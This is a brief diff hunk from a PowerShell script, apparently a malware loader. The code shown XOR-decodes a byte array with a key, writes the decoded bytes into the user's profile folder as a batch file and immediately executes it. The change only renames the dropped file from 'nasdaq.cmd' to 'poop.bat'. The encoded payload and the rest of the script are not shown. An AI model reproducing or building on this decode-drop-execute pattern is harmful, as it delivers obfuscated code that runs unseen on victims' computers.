@@ -26,11 +26,11 @@ $o=[byte[]](0..($b.Length-1)|%{
     $b[$_] -bxor $kb[$_%$kb.Length]
 })
 
-    [IO.File]::WriteAllBytes("$env:USERPROFILE\nasdaq.cmd",$o)
+    [IO.File]::WriteAllBytes("$env:USERPROFILE\poop.bat",$o)
 
 
 
-& "$env:USERPROFILE\nasdaq.cmd"
+& "$env:USERPROFILE\poop.bat"
 
 }
 catch{
